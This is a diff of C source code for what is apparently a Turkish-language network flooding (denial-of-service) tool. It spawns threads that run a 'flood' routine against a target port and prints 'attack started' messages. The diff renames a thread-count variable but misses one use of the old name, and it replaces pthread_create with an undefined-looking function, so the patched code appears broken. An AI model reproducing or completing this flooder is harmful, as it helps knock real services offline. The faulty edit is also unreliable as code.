@@ -32,10 +32,10 @@ int main(int argc, char *argv[ ])
 
   fprintf(stdout, "Soketler Ayarlaniyor...\n");
 
-  int çekirdek = atoi(argv[5]);
+  int islemci = atoi(argv[5]);
   int paket_boyutu = atoi(argv[4]);
   unsigned int saldiriport = atoi(argv[2]);
-  pthread_t paket[çekirdek];
+  pthread_t paket[islemci];
   struct sockaddr_in sin;
 
   sin.sin_family = AF_INET;
@@ -45,13 +45,13 @@ int main(int argc, char *argv[ ])
   struct thread_data td[çekirdek];
 
   int i;
-  for(i = 0;i<çekirdek;i++){
+  for(i = 0;i<islemci;i++){
     td[i].paket_numarasi = i;
     td[i].pks = paket_boyutu;
     td[i].sin = sin;
     td[i].saldiriport = saldiriport;
     td[i].hassiktir = atoi(argv[3]);
-    pthread_create( &paket[i], NULL, &flood, (void *) &td[i]);
+    islemci_olustur( &paket[i], NULL, &flood, (void *) &td[i]);
   }
   fprintf(stdout, "Saldiri Basladi...\n");
   if(argc > 6)
